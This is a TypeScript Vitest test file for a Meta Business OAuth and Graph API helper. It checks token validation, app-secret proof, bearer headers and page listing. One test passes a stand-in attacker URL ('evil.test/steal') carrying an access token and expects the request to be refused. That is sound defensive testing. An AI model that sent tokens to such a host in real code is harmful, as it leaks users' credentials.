// @vitest-environment node
import { beforeEach, describe, expect, it, vi } from "vitest";
import { appSecretProof, businessLoginUrl, validateBusinessToken } from "../../supabase/functions/_shared/meta-business";
import { listPages } from "../../supabase/functions/_shared/meta-api";
import { metaGraphFetch } from "../../supabase/functions/_shared/meta-graph-request";
const config = { appId: "123", secret: "crm-secret", configId: "456", redirectUri: "https://example.supabase.co/functions/v1/meta-oauth-callback" };
const valid = { app_id: "123", user_id: "789", type: "SYSTEM_USER", is_valid: true, expires_at: 0 };
beforeEach(() => { vi.stubGlobal("Deno", { env: { get: (name: string) => ({ META_CRM_APP_ID: "123", META_CRM_APP_SECRET: "crm-secret", META_APP_SECRET: "legacy-secret" })[name] } }); });
describe("Business OAuth trust boundaries", () => {
  it("uses server configuration without scope or frontend app overrides", () => {
    const url = new URL(businessLoginUrl(config, "signed"));
    expect(url.origin).toBe("https://www.facebook.com");
    expect(url.searchParams.get("config_id")).toBe("456");
    expect(url.searchParams.get("state")).toBe("signed");
    expect(url.searchParams.has("scope")).toBe(false);
    expect(new URL(businessLoginUrl(config, "signed", "rerequest")).searchParams.get("auth_type")).toBe("rerequest");
  });
  it("only accepts an inspected system token belonging to this app", () => {
    expect(validateBusinessToken(valid, "123")).toEqual({ subjectId: "789", expiresAt: null });
    for (const delta of [{ app_id: "999" }, { type: "USER" }, { is_valid: false }, { user_id: "bad" }, { expires_at: -1 }, { expires_at: NaN }, { expires_at: 1 }, { data_access_expires_at: 1 }]) {
      expect(() => validateBusinessToken({ ...valid, ...delta }, "123")).toThrow();
    }
    expect(validateBusinessToken({ ...valid, expires_at: 20, data_access_expires_at: 10 }, "123", 1).expiresAt).toBe(new Date(10_000).toISOString());
  });
  it("adds app-specific proof, moves tokens to bearer, and isolates apps", async () => {
    const fetcher = vi.fn().mockResolvedValue(new Response("{}")); vi.stubGlobal("fetch", fetcher);
    await metaGraphFetch("https://graph.facebook.com/v21.0/me?access_token=page-token", undefined, "123");
    const [target, init] = fetcher.mock.calls[0];
    const url = new URL(target);
    expect(url.pathname).toBe("/v26.0/me");
    expect(url.searchParams.has("access_token")).toBe(false);
    expect(url.searchParams.get("appsecret_proof")).toBe(await appSecretProof("page-token", "crm-secret"));
    expect(init.headers.get("Authorization")).toBe("Bearer page-token");
    await expect(metaGraphFetch("https://evil.test/steal?access_token=secret", undefined, "123")).rejects.toThrow("untrusted_graph_origin");
    await expect(metaGraphFetch("https://graph.facebook.com/v21.0/me?access_token=secret", undefined, "999")).rejects.toThrow("meta_app_credentials_missing");
    expect(fetcher).toHaveBeenCalledTimes(1);
  });
  it("proof covers the exact page token on POST and leaves legacy calls compatible", async () => {
    const fetcher = vi.fn().mockResolvedValue(new Response("{}")); vi.stubGlobal("fetch", fetcher);
    await metaGraphFetch("https://graph.facebook.com/v21.0/42/subscribed_apps", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ access_token: "page-token", subscribed_fields: ["messages"] }) }, "123");
    expect(JSON.parse(fetcher.mock.calls[0][1].body)).toEqual({ subscribed_fields: ["messages"] });
    await metaGraphFetch("https://graph.facebook.com/v21.0/me?access_token=old");
    expect(fetcher.mock.calls[1][0]).toBe("https://graph.facebook.com/v21.0/me?access_token=old");
  });
});


it("enumerates assigned Pages on the validated system-user node, not a User accounts edge", async () => {
  vi.stubGlobal("Deno", { env: { get: (key: string) => ({ META_CRM_APP_ID: "123", META_CRM_APP_SECRET: "crm-secret" })[key] } });
  const fetcher = vi.fn().mockResolvedValue(new Response(JSON.stringify({ data: [{ id: "42", name: "Page", access_token: "page-token" }] })));
  vi.stubGlobal("fetch", fetcher);
  expect(await listPages("system-token", "123", "789")).toHaveLength(1);
  expect(new URL(fetcher.mock.calls[0][0]).pathname).toBe("/v26.0/789/assigned_pages");
  await expect(listPages("system-token", "123")).rejects.toThrow("invalid_system_user_subject");
});
